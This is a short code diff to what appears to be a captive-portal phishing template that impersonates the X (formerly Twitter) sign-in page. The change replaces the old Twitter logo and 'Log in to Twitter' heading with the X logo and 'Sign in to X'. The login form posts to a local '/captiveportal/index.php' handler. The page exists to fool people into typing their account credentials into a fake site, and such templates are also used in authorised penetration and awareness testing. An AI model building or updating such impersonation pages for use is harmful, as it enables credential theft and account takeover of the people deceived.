@@ -128,13 +128,9 @@ require_once('helper.php');
     <div class="container">
       <div class="account-wall">
 
-        <div class="google-header-bar centered">
-          <div class="header content clearfix">
-            <img alt="Twitter" class="logo" src="assets\img\j35g5c9082.png">
-          </div>
-        </div>
+        <svg width="100%" height="50px" viewBox="0 0 24 24" aria-label="X" role="img" class="r-4qtqp9 r-yyyyoo r-dnmrzs r-bnwqim r-lrvibr r-m6rgpd r-1nao33i r-16y2uox r-lwhw9o"><g><path d="M21.742 21.75l-7.563-11.179 7.056-8.321h-2.456l-5.691 6.714-4.54-6.714H2.359l7.29 10.776L2.25 21.75h2.456l6.035-7.118 4.818 7.118h6.191-.008zM7.739 3.818L18.81 20.182h-2.447L5.29 3.818h2.447z"></path></g></svg>
 
-        <h1 class="text-center login-title">Log in to Twitter</h1>
+        <h1 class="text-center login-title">Sign in to X</h1>
 
           <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
 
